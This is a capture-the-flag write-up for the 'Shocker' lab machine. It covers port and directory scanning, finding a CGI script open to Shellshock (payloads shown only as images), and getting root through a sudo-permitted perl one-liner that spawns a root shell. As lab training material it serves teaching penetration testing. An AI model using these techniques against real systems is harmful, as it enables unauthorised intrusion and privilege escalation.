# Shocker

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.146
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 12:22 EDT
Nmap scan report for 10.129.85.146
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-
```

Port 80 is open.

### Shellshock

When the webpage is visited, all we see is this:

<figure><img src="../../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

I did a `feroxbuster` script on the website.&#x20;

```
$ feroxbuster -u http://10.129.85.146 -f -n      

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.85.146
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        9l       13w      137c http://10.129.85.146/
403      GET       11l       32w      296c http://10.129.85.146/cgi-bin/
403      GET       11l       32w      294c http://10.129.85.146/icons/
403      GET       11l       32w      302c http://10.129.85.146/server-status/
```

I continued fuzzing and found a `user.sh` file. When downloaded, this is the response:

```http
HTTP/1.1 200 OK
Date: Wed, 03 May 2023 16:27:22 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 119

Content-Type: text/plain

Just an uptime test script

 12:27:22 up 40 min,  0 users,  load average: 0.58, 0.31, 0.11
```

The Content-Type was unique and I've never seen that before. A quick Google search on exploits regarding it led to Shellshock.&#x20;

{% embed url="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" %}

This software bugs allows us to have RCE on the website because of how environments variables are handled poorly in some websites. We can test it out by sending requests to the `user.sh` file and seeing if any bash commands get executed.&#x20;

<figure><img src="../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

So it does work. We can replace the `ping` command with a reverse shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Perl

When checking `sudo` permissions, we see this:

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Based on GTFOBins, we just need to execute this to get a `root` shell.

{% code overflow="wrap" %}
```bash
sudo perl -e 'exec "/bin/bash";'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

Rooted!
